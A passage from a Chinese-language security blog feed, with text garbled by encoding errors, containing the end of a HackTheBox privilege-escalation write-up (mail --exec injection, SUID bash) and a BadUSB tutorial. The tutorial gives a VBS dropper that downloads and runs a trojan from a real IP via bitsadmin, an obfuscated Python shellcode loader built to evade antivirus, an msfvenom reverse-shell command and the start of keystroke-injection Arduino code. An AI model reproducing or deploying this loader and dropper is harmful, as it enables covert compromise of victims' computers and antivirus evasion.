</span><br><span class="line">-m å§‹ç»ˆä¿æŒç›‘å¬çŠ¶æ€ï¼Œé»˜è®¤è§¦å‘äº‹ä»¶å³é€€å‡º</span><br><span class="line">-r é€’å½’æŸ¥è¯¢ç›®å½•</span><br><span class="line">-q å‡å°‘ä¸å¿…è¦çš„è¾“å‡º(åªæ‰“å°äº‹ä»¶ä¿¡æ¯)</span><br><span class="line"> </span><br><span class="line">-e å®šä¹‰ç›‘æ§çš„äº‹ä»¶ï¼Œå¯ç”¨å‚æ•°ï¼š</span><br><span class="line">    open   æ‰“å¼€æ–‡ä»¶</span><br><span class="line">    access è®¿é—®æ–‡ä»¶</span><br><span class="line">    modify ä¿®æ”¹æ–‡ä»¶</span><br><span class="line">    delete åˆ é™¤æ–‡ä»¶</span><br><span class="line">    create æ–°å»ºæ–‡ä»¶</span><br><span class="line">    attrib å±æ€§å˜æ›´</span><br><span class="line"> </span><br><span class="line">--exclude &lt;pattern&gt; æŒ‡å®šè¦æ’é™¤ç›‘æ§çš„æ–‡ä»¶/ç›®å½•</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹å‡ºæ­¤å¤„inotifywaitç›‘æ§çš„äº‹ä»¶æ˜¯&#x2F;var&#x2F;www&#x2F;private&#x2F;leave_requests.csvæ–‡ä»¶çš„æ›´æ”¹ã€‚å°è¯•ä¿®æ”¹ä¸€ä¸‹&#x2F;var&#x2F;www&#x2F;private&#x2F;leave_requests.csvæ–‡ä»¶ï¼Œçœ‹çœ‹è¿›ç¨‹å˜åŒ–ï¼š</p><p><a href="https://pic.imgdb.cn/item/63d5eeffface21e9efebe099.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d5eeffface21e9efebe099.jpg"></a></p><p><a href="https://pic.imgdb.cn/item/63d5ef0dface21e9efebfa54.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d5ef0dface21e9efebfa54.jpg"></a></p><p>å‘ç°ä¸Šå›¾ä¸­è¿™é‡Œä½¿ç”¨äº†å…·æœ‰rootæƒé™çš„mailå‘½ä»¤ï¼Œå°†â€Leave Request:â€åŠ ä¸Šæˆ‘ä»¬å†™å…¥åˆ°&#x2F;var&#x2F;www&#x2F;private&#x2F;leave_requests.csvä¸­çš„å†…å®¹ï¼ˆâ€œtestâ€ï¼‰å‘é€ç»™äº†christineç”¨æˆ·ã€‚è¿™é‡Œä»ç„¶å­˜åœ¨å‘½ä»¤æ³¨å…¥ã€‚å‚è€ƒé“¾æ¥ï¼š<a href="https://gtfobins.github.io/gtfobins/mail/">https://gtfobins.github.io/gtfobins/mail/</a></p><p>æ ¹æ®gtfobinsä¸­ä»‹ç»çš„ï¼Œæˆ‘ä»¬å¯ä»¥æƒ³åˆ°åˆ©ç”¨mailå‘½ä»¤çš„â€“execå‚æ•°æ¥æ‰§è¡Œshellè„šæœ¬ã€‚ç¼–å†™shellè„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">chmod +s /bin/bash</span><br></pre></td></tr></table></figure><p><a href="https://pic.imgdb.cn/item/63d5ef19face21e9efec1089.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d5ef19face21e9efec1089.jpg"></a></p><p>æ¥ç€è¿›è¡Œå‘½ä»¤æ³¨å…¥ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www-data@awkward:~/private$ echo &#x27;&quot; --exec=&quot;\!/tmp/2.sh&quot;&#x27; &gt;&gt; leave_requests.csv</span><br></pre></td></tr></table></figure><p><a href="https://pic.imgdb.cn/item/63d5ef2aface21e9efec2fb7.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d5ef2aface21e9efec2fb7.jpg"></a></p><p>æ¥ç€ä»¥SUIDå¯åŠ¨&#x2F;bin&#x2F;bashï¼ŒæŸ¥çœ‹root.txt:</p><p><a href="https://pic.imgdb.cn/item/63d5ef39face21e9efec4f5b.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d5ef39face21e9efec4f5b.jpg"></a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> hackthebox </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆæ¢BadUSB</title>
      <link href="/2022/12/01/badusb/"/>
      <url>/2022/12/01/badusb/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ€è¿‘å¶ç„¶äº†è§£åˆ°â€BadUSBâ€ï¼Œæ„Ÿè§‰å¾ˆå¥½ç©ï¼Œè¯•ç€åˆ¶ä½œäº†ä¸€ä¸ªï¼Œè¿‡ç¨‹å¾ˆæ›²æŠ˜åå·ã€‚æˆ‘ä¹Ÿå°è¯•å»ç»•è¿‡äº†ä¸€äº›AntiVirusçš„æ£€æµ‹ï¼Œç»“æœä¹Ÿæ˜¯æ¯”è¾ƒè®©è‡ªå·±æ»¡æ„çš„ã€‚æ¥ä¸‹æ¥çš„æ–‡ç« æˆ‘å°†æŒ‰ç…§æˆ‘çš„æ€è·¯è¿›è¡Œï¼Œå†™ä¸€ä¸‹BadUSBçš„åˆ¶ä½œè¿‡ç¨‹ï¼Œä»¥åŠé‡åˆ°çš„å›°éš¾å’Œè§£å†³åŠæ³•ã€‚ï¼ˆå°ç™½æ–‡ï¼Œå¯èƒ½æœ‰äº›åŸºç¡€çš„ä¸œè¥¿è§£é‡Šçš„æœ‰ç‚¹å¤šï¼‰</p><h2 id="BadUSBåŸç†æµ…æ"><a href="#BadUSBåŸç†æµ…æ" class="headerlink" title="BadUSBåŸç†æµ…æ"></a>BadUSBåŸç†æµ…æ</h2><p>åœ¨2014å¹´çš„BlackHatå¤§ä¼šä¸Šï¼Œä¿¡æ¯å®‰å…¨ä¸“å®¶å±•ç¤ºäº†ä¸€ç§æ–°çš„ç½‘ç»œå®‰å…¨å¨èƒï¼Œè¿™ç§æŠ€æœ¯è¢«ç§°ä¸ºBadUSBï¼Œè¯¥æ¼æ´ç”±Karsten Nohlå’ŒJakob Lellå…±åŒå‘ç°ã€‚åœ¨åˆ†æBadUSBçš„åŸç†å‰ï¼Œæˆ‘è®¤ä¸ºåº”è¯¥å…ˆäº†è§£ä¸€ä¸‹HIDæ”»å‡»åŸç†ã€‚</p><h3 id="HIDæ”»å‡»åŸç†"><a href="#HIDæ”»å‡»åŸç†" class="headerlink" title="HIDæ”»å‡»åŸç†"></a>HIDæ”»å‡»åŸç†</h3><p>HIDæ˜¯Human Interface Deviceçš„ç¼©å†™ï¼Œç”±å…¶åç§°å¯ä»¥äº†è§£HIDè®¾å¤‡æ˜¯ç›´æ¥ä¸äººäº¤äº’çš„è®¾å¤‡ï¼Œä¾‹å¦‚é”®ç›˜ã€é¼ æ ‡ä¸æ¸¸æˆæ†ç­‰ã€‚ä¸è¿‡HIDè®¾å¤‡å¹¶ä¸ä¸€å®šè¦æœ‰äººæœºæ¥å£ï¼Œåªè¦ç¬¦åˆHIDç±»åˆ«è§„èŒƒçš„è®¾å¤‡éƒ½æ˜¯HIDè®¾å¤‡ã€‚ä¸€èˆ¬æ¥è®²é’ˆå¯¹HIDçš„æ”»å‡»ä¸»è¦é›†ä¸­åœ¨é”®ç›˜é¼ æ ‡ä¸Šï¼Œå› ä¸ºåªè¦æ§åˆ¶äº†ç”¨æˆ·é”®ç›˜ï¼ŒåŸºæœ¬ä¸Šå°±ç­‰äºæ§åˆ¶äº†ç”¨æˆ·çš„ç”µè„‘ã€‚æ”»å‡»è€…ä¼šæŠŠæ”»å‡»éšè—åœ¨ä¸€ä¸ªæ­£å¸¸çš„é¼ æ ‡é”®ç›˜ä¸­ï¼Œå½“ç”¨æˆ·å°†å«æœ‰æ”»å‡»å‘é‡çš„é¼ æ ‡æˆ–é”®ç›˜ï¼Œæ’å…¥ç”µè„‘æ—¶ï¼Œæ¶æ„ä»£ç ä¼šè¢«åŠ è½½å¹¶æ‰§è¡Œã€‚</p><p>åœ¨BadUSBå‡ºç°ä¹‹å‰ï¼Œåˆ©ç”¨HIDè¿›è¡Œæ”»å‡»çš„æ–¹å¼ä¸€èˆ¬æœ‰ä¸¤ç§ï¼šUSB RUBBER DUCKYå’ŒTEENSYã€‚è¿™ä¸¤ç§æ”»å‡»æ–¹å¼ï¼Œæ˜¯åœ¨BadUSBå…¬å¸ƒä¹‹å‰ï¼Œæ¯”è¾ƒæµè¡Œçš„ä¸¤ç§HIDæ”»å‡»æ–¹å¼ã€‚ç¼ºé™·åœ¨äºè¦å®šåˆ¶ç¡¬ä»¶è®¾å¤‡ï¼Œé€šç”¨æ€§è¾ƒå·®ã€‚ä½†æ˜¯BadUSBå°±ä¸ä¸€æ ·äº†ï¼Œå®ƒæ˜¯åœ¨â€œUSB RUBBER DUCKYâ€å’Œâ€œTeensyâ€æ”»å‡»æ–¹å¼çš„åŸºç¡€ä¸Šç”¨é€šç”¨çš„USBè®¾å¤‡ï¼ˆæ¯”å¦‚Uç›˜ï¼‰ã€‚</p><h3 id="BadUSBä¸ªäººç†è§£"><a href="#BadUSBä¸ªäººç†è§£" class="headerlink" title="BadUSBä¸ªäººç†è§£"></a>BadUSBä¸ªäººç†è§£</h3><p>é€šä¿—ä¸€ç‚¹æ¥è§£é‡ŠBadUSBçš„æ”»å‡»æ–¹å¼ï¼šå½“BadUSBæ’å…¥PCåï¼Œä¼šæ¨¡æ‹Ÿå‡ºä¸€ä¸ªè™šæ‹Ÿé”®ç›˜ï¼ŒåŒæ—¶æ‰§è¡Œæˆ‘ä»¬äº‹å…ˆå†™å…¥åˆ°å›ºä»¶ä¸­çš„ä»£ç æ¥æ•²å‡»ç›¸åº”çš„æŒ‰é”®ï¼Œè¾“å…¥æ”»å‡»ä»£ç ä»è€Œå®Œæˆä¸€äº›æ¶æ„è¡Œä¸ºï¼Œå¦‚è¿œç¨‹ä¸‹è½½æœ¨é©¬å¹¶æ‰§è¡Œæˆ–è€…å¼ºåˆ¶å…³æœºç­‰ç­‰ï¼ˆå¼ºåˆ¶å…³æœºå¯èƒ½æœ‰ç‚¹æ‰å¼„äººâ€¦â€¦ï¼‰ã€‚</p><p>Uç›˜çš„å†…éƒ¨æ„é€ ï¼š</p><p><a href="https://pic.imgdb.cn/item/63886eb116f2c2beb11a1423.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63886eb116f2c2beb11a1423.png"></a></p><p>å¯ä»¥çœ‹åˆ°ï¼ŒUç›˜å¤§è‡´ç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼Œä¸€éƒ¨åˆ†æ˜¯èŠ¯ç‰‡å¼•å¯¼ç¨‹åºï¼Œä¸€éƒ¨åˆ†æ˜¯é—ªå­˜åŒºåŸŸã€‚</p><p>èŠ¯ç‰‡æ§åˆ¶å™¨è´Ÿè´£ä¸PCçš„é€šè®¯å’Œè¯†åˆ«ï¼Œé—ªå­˜ç”¨æ¥åšæ•°æ®å­˜å‚¨ï¼›é—ªå­˜ä¸­æœ‰ä¸€éƒ¨åˆ†åŒºåŸŸç”¨æ¥å­˜æ”¾Uç›˜çš„å›ºä»¶ï¼Œå®ƒçš„ä½œç”¨ç±»ä¼¼äºæ“ä½œç³»ç»Ÿï¼Œæ§åˆ¶è½¯ç¡¬ä»¶äº¤äº’ï¼›å›ºä»¶æ— æ³•é€šè¿‡æ™®é€šæ‰‹æ®µè¿›è¡Œè¯»å–ã€‚æˆ‘ä»¬çš„æ¶æ„ä»£ç æ­£æ˜¯å†™å…¥åœ¨å›ºä»¶ä¸­ï¼Œè€Œè¿™éƒ¨åˆ†åŒºåŸŸæ˜¯æ€æ¯’è½¯ä»¶æ— æ³•è®¿é—®çš„åŒºåŸŸï¼Œå› æ­¤å¤§éƒ¨åˆ†æ€æ¯’è½¯ä»¶æ˜¯æ ¹æœ¬æ— æ³•åº”å¯¹BadUSBæ”»å‡»çš„ã€‚</p><p>æˆ‘ä»¬å¯ä»¥æƒ³è±¡è¿™æ ·ä¸€ä¸ªåœºæ™¯ï¼Œé»‘å®¢åœ¨å’–å•¡å…ã€æœºåœºæˆ–è€…å…¬å›­çš„é•¿æ¤…æ•…æ„æ”¾ç½®è¿™ç§å†™å…¥äº†æ¶æ„ç¨‹åºçš„USBç¡¬ä»¶ï¼Œæœ‰äº›äººå¯èƒ½ä¼šå› ä¸ºå¥½å¥‡æ¡èµ°è¿™äº›è®¾å¤‡ï¼Œå¹¶è¿«ä¸åŠdieåœ°æ’å…¥ç”µè„‘ä¸­æƒ³è¦çœ‹çœ‹é‡Œé¢æœ‰ä»€ä¹ˆå®è—ï¼Œè€Œè¿™æ­£é™·å…¥äº†é»‘å®¢è®¾è®¡çš„é™·é˜±ä¸­ã€‚è¿™ç§æ”»å‡»è¡Œä¸ºä¹Ÿç»å¸¸è¢«åˆ©ç”¨åœ¨ä¸€äº›æŠ¤ç½‘è¡ŒåŠ¨ä¸­ï¼Œæœ‰äº›çº¢é˜Ÿæˆå‘˜ä¼šæ•…æ„åœ¨ç°åœºè½ä¸‹ä¸€ä¸ªUç›˜ï¼Œè¢«è“é˜Ÿæˆå‘˜æ¡èµ°åæ’å…¥ç”µè„‘ä¸­ï¼ŒæˆåŠŸè·å¾—è“é˜Ÿæˆå‘˜ç”µè„‘çš„æ§åˆ¶æƒã€‚</p><h2 id="å·¥å…·å‡†å¤‡"><a href="#å·¥å…·å‡†å¤‡" class="headerlink" title="å·¥å…·å‡†å¤‡"></a>å·¥å…·å‡†å¤‡</h2><p>1ã€ä¸€å°æœ‰å…¬ç½‘IPçš„æœåŠ¡å™¨</p><p>2ã€ä¸€å—æ·˜å®ä¸Š14å—é’±è´­ä¹°çš„Digisparkå¼€å‘æ¿ï¼š</p><p><a href="https://pic.imgdb.cn/item/63886f5c16f2c2beb11c2648.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63886f5c16f2c2beb11c2648.png"></a></p><p>3ã€è½¯ä»¶é©±åŠ¨ï¼š</p><p>ä¸‹è½½åœ°å€ï¼š<a href="https://github.com/digistump/DigistumpArduino/releases">https://github.com/digistump/DigistumpArduino/releases</a></p><p>4ã€Arduino IDE(Arduino IDEçš„å®‰è£…å’Œé…ç½®æ•™ç¨‹ç½‘ä¸Šå¾ˆå¤šï¼Œè¿™é‡Œä¸å†èµ˜è¿°)</p><p>5ã€CobaltStrike</p><p>6ã€Metasploit</p><h2 id="Bypass-ç«ç»’"><a href="#Bypass-ç«ç»’" class="headerlink" title="Bypass ç«ç»’"></a>Bypass ç«ç»’</h2><h3 id="vbsç¼–å†™"><a href="#vbsç¼–å†™" class="headerlink" title="vbsç¼–å†™"></a>vbsç¼–å†™</h3><p>å…³äºç»•è¿‡ç«ç»’ï¼Œæˆ‘çš„æ€è·¯æ˜¯è¿™æ ·çš„ï¼šé¦–å…ˆåˆ©ç”¨Metasploitç”Ÿæˆshellcodeï¼Œç„¶åç¼–å†™å…æ€ä»£ç è¿›è¡Œå…æ€ç”Ÿæˆexeé©¬ï¼Œæ¥ç€åˆ©ç”¨windowsçš„makecabå‘½ä»¤æ¥å‹ç¼©è¿™ä¸ªexeé©¬ä¸ºzipï¼Œæ¥ç€æŠŠç”Ÿæˆçš„zipæ”¾åœ¨å…¬ç½‘æœåŠ¡å™¨ä¸Šã€‚æ’å…¥BadUSBåï¼Œç¨‹åºæ¨¡æ‹Ÿé”®ç›˜è¾“å…¥å¦‚ä¸‹å†…å®¹è‡³microsoft.vbsæ–‡ä»¶ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set ws=WScript.CreateObject(&quot;WScript.Shell&quot;) </span><br><span class="line"></span><br><span class="line">ws.Run&quot;cmd.exe /c mkdir c:\temp1 &amp;&amp; bitsadmin  /transfer n http://124.221.248.16:888/QQ_cache.zip c:\temp1\QQ_cache.zip &amp;&amp; expand c:\temp1\QQ_cache.zip c:\temp1\QQ_cache.exe &amp;&amp; del c:\temp1\QQ_cache.zip &amp;&amp; c:\temp1\QQ_cache.exe&quot;,0</span><br></pre></td></tr></table></figure><p>æ¥ç€æ‰§è¡Œè¿™ä¸ªvbsæ–‡ä»¶ã€‚é‚£ä¹ˆè¿™æ®µä»£ç çš„å«ä¹‰æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ</p><p>é¦–å…ˆåˆ›å»ºä¸€ä¸ªC:\temp1æ–‡ä»¶å¤¹ï¼Œæ¥ç€åœ¨å…¬ç½‘æœåŠ¡å™¨ä¸Šä¸‹è½½ç”Ÿæˆçš„zipæ–‡ä»¶è‡³è¿™ä¸ªæ–‡ä»¶å¤¹ï¼Œåˆ©ç”¨expandè§£å‹zipæ–‡ä»¶å¾—åˆ°exeé©¬ï¼Œç„¶ååˆ é™¤zipæ–‡ä»¶å¹¶æ‰§è¡Œexeé©¬ã€‚</p><p>è¿™é‡Œæœ‰å‡ ä¸ªé—®é¢˜ã€‚é¦–å…ˆæˆ‘ä¸ºä»€ä¹ˆä¼šä½¿ç”¨bitsadminæ¥ä¸‹è½½æ–‡ä»¶è€Œécertutilæˆ–powershellå‘¢ï¼Ÿ</p><p>åŸå› æ˜¯bitsadminä¸‹è½½æ–¹å¼ç›¸å¯¹äºcertutilå’Œpowershellä¸‹è½½æ–¹å¼æ¥è¯´å…æ€æ•ˆæœä¼¼ä¹æ›´å¥½ã€‚åœ¨æˆ‘çš„ç”µè„‘ä¸Šï¼ˆå·²å®‰è£…ç«ç»’æ€æ¯’è½¯ä»¶ï¼‰æµ‹è¯•ï¼Œä½¿ç”¨certutilä¸‹è½½æ–‡ä»¶ï¼Œç«ç»’è™½æœªæŠ¥è­¦ï¼Œå´ä¼šåœ¨å®‰å…¨æ—¥å¿—ä¸­å­˜åœ¨è®°å½•ï¼Œè€Œå¦‚æœåˆ©ç”¨powershellä¸‹è½½çš„è¯åˆ™ä¼šç›´æ¥æŠ¥è­¦ï¼š</p><p><a href="https://pic.imgdb.cn/item/63887a0f16f2c2beb12ae74d.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63887a0f16f2c2beb12ae74d.png"></a></p><p><a href="https://pic.imgdb.cn/item/63887a0316f2c2beb12ad9ea.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63887a0316f2c2beb12ad9ea.png"></a></p><p>é‚£ä¹ˆä¸ºä»€ä¹ˆè¦å¤šæ­¤ä¸€ä¸¾çš„åœ¨å…¬ç½‘æœåŠ¡å™¨ä¸Šæ”¾ç½®çš„æœ¨é©¬æ–‡ä»¶æ˜¯zipæ–‡ä»¶è€Œä¸ç›´æ¥æ˜¯exeé©¬å‘¢ï¼Ÿå› ä¸ºç›´æ¥ä¸‹è½½exeçš„è¯ä¸è®ºä»€ä¹ˆä¸‹è½½å‘½ä»¤æ€æ¯’è½¯ä»¶éƒ½ä¼šç›´æ¥æŠ¥è­¦ï¼Œè€Œå¦‚æœä¸‹è½½çš„æ˜¯zipæ–‡ä»¶ï¼Œç«ç»’æ˜¯ä¸ä¼šæŠ¥è­¦çš„ã€‚å¹¶ä¸”æˆ‘ä»¬å¯ä»¥ç›´æ¥åˆ©ç”¨windowsè‡ªå¸¦çš„è§£å‹å‘½ä»¤expandæ¥è§£å‹è¯¥zipæ–‡ä»¶ã€‚</p><p>æœ€åä¸€ä¸ªä¹Ÿæ˜¯æœ€é‡è¦çš„é—®é¢˜æ˜¯è§£å‹ä¸‹æ¥çš„æœ¨é©¬æ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯æœ¨é©¬.exeæ–‡ä»¶å¦‚ä½•åšå…æ€ä»è€Œç»•è¿‡ç«ç»’æˆ–è€…è¯´å¤§éƒ¨åˆ†æ€è½¯å‘¢ï¼Ÿ</p><h3 id="å…æ€æœ¨é©¬ç¼–å†™"><a href="#å…æ€æœ¨é©¬ç¼–å†™" class="headerlink" title="å…æ€æœ¨é©¬ç¼–å†™"></a>å…æ€æœ¨é©¬ç¼–å†™</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">shell_code,keys</span>):</span><br><span class="line">    shell_code_base64 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    random.seed(keys)</span><br><span class="line">    code = shell_code.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> code:</span><br><span class="line">        item = <span class="built_in">int</span>(item)</span><br><span class="line">        shell_code_base64 += <span class="built_in">chr</span>(item ^ random.randint(<span class="number">0</span>, <span class="number">255</span>))</span><br><span class="line">    <span class="keyword">return</span> shell_code_base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fs_decode</span>(<span class="params">funcs</span>):</span><br><span class="line">    fs_keys = <span class="string">&#x27;123&#x27;</span></span><br><span class="line">    func_codes = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    random.seed(fs_keys)</span><br><span class="line">    func_code = funcs.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> func_code:</span><br><span class="line">        item = <span class="built_in">int</span>(item)</span><br><span class="line">        func_codes += <span class="built_in">chr</span>(item ^ random.randint(<span class="number">0</span>, <span class="number">255</span>))</span><br><span class="line">    <span class="keyword">return</span> func_codes</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">ShellCode,keys</span>):</span><br><span class="line">    random.seed(keys)</span><br><span class="line">    ShellCode_2 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> ShellCode:</span><br><span class="line">        ShellCode_2 += <span class="built_in">str</span>(<span class="built_in">ord</span>(item) ^ random.randint(<span class="number">0</span>, <span class="number">255</span>)) + <span class="string">&#x27;,&#x27;</span></span><br><span class="line">    ShellCode_2 = ShellCode_2.strip(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> ShellCode_2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">shellcode</span>):</span><br><span class="line">    ctypes.windll.kernel32.VirtualAlloc.restype=ctypes.c_uint64</span><br><span class="line">    rwxpage = ctypes.windll.kernel32.VirtualAlloc(<span class="number">0</span>, <span class="built_in">len</span>(shellcode), <span class="number">0x3000</span>, <span class="number">0x40</span>)</span><br><span class="line">    funcs = <span class="string">&#x27;70,208,133,111,226,123,113,146,231,30,133,20,54,203,71,77,230,234,182,55,207,108,203,231,232,79,137,160,182,180,203,54,84,167,78,235,21,203,131,209,183,25,202,144,179,84,168,137,158,181,33,136,154,102,166,98,8,179,139,242,251,26,1,178,19,125,22,209,56,51,119,41,229,118,164,182,74,178,157,53,248,183,48,58,66,179,109,168,30,182,106,60,119,170,147,57,73,4,41,221,62,148,2,9,60,188,167,47,194,232,35,141,240,193,78,169,122,86&#x27;</span></span><br><span class="line">    func = fs_decode(funcs)</span><br><span class="line">    <span class="built_in">exec</span>(func)</span><br><span class="line">    handle = ctypes.windll.kernel32.CreateThread(<span class="number">0</span>, <span class="number">0</span>, ctypes.c_uint64(rwxpage), <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    ctypes.windll.kernel32.WaitForSingleObject(handle, -<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    ShellCode = <span class="string">&#x27;&#x27;&#x27; ShellCode &#x27;&#x27;&#x27;</span></span><br><span class="line">    keys = <span class="string">&#x27;Axx8&#x27;</span></span><br><span class="line">    shell_code = encode(ShellCode.replace(<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>),keys)</span><br><span class="line">    shellcode = decode(shell_code,keys)</span><br><span class="line">    shellcode = base64.b64decode(shellcode)</span><br><span class="line">    run(shellcode)</span><br></pre></td></tr></table></figure><p><strong>ç”ŸæˆShellCode</strong></p><p><code>msfvenom -p windows/x64/meterpreter/reverse\_tcp lhost=vps\_ip lport=vps\_port --encrypt base64 -f c</code></p><p>ç”Ÿæˆçš„shellcodeç›´æ¥æ›¿æ¢ç»™å‡ºçš„ä»£ç ä¸­çš„ShellCodeå³å¯ã€‚</p><p>æ¥ç€æˆ‘ä»¬åˆ©ç”¨pyinstallerç”Ÿæˆä¸€ä¸ªexeæ–‡ä»¶ï¼š</p><p><code>pyinstaller -F -i qq.ico QQ\_cache.py</code></p><p><a href="https://pic.imgdb.cn/item/63887d9516f2c2beb132d8e4.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63887d9516f2c2beb132d8e4.jpg"></a></p><p>è¿™ä¸ªæœ¨é©¬äº²æµ‹å¯ç»•è¿‡360å’Œç«ç»’ã€‚å› ä¸ºåœ¨æˆ‘çš„å…¬ç½‘æœåŠ¡å™¨ä¸Šå¹¶æ²¡æœ‰metasploitï¼Œå› æ­¤ä¸Šè¿°ç”Ÿæˆshellcodeçš„æ“ä½œæˆ‘æ˜¯åœ¨è‡ªå·±çš„kaliä¸Šå®ç°çš„ã€‚å› ä¸ºä¸å¤ªæƒ³åœ¨å…¬ç½‘æœåŠ¡å™¨ä¸Šä¸‹è½½ä¸€ä¸ªmetasploitï¼Œå› æ­¤æˆ‘åˆ©ç”¨frpå®ç°äº†ä¸ªå†…ç½‘ç©¿é€ï¼Œåœ¨è‡ªå·±kaliçš„metasploitä¸Šç›‘å¬1234ç«¯å£ï¼Œfrpé…ç½®å¦‚ä¸‹ï¼š</p><p>frps.iniï¼š</p><p><a href="https://pic.imgdb.cn/item/6388ce5016f2c2beb1d0a9e7.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/6388ce5016f2c2beb1d0a9e7.png"></a></p><p>frpc.iniï¼š</p><p><a href="https://pic.imgdb.cn/item/6388ce5e16f2c2beb1d0b8ac.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/6388ce5e16f2c2beb1d0b8ac.png"></a></p><h3 id="ç¼–å†™Arduinoä»£ç "><a href="#ç¼–å†™Arduinoä»£ç " class="headerlink" title="ç¼–å†™Arduinoä»£ç "></a>ç¼–å†™Arduinoä»£ç </h3><p>æ¥ç€å°±æ˜¯å®ŒæˆArduinoä»£ç äº†ï¼Œè¿™é‡Œç›´æ¥ç»™å‡ºä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;DigiKeyboard.h&quot;</span></span></span><br><span class="line">String a;</span><br><span class="line">String b;</span><br><span class="line">String c;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">setup</span><span class="params">()</span> &#123;</span><br><span class="line">DigiKeyboard.sendKeyStroke(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DigiKeyboard.delay(<span class="number">300</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(<span class="number">57</span>);<span 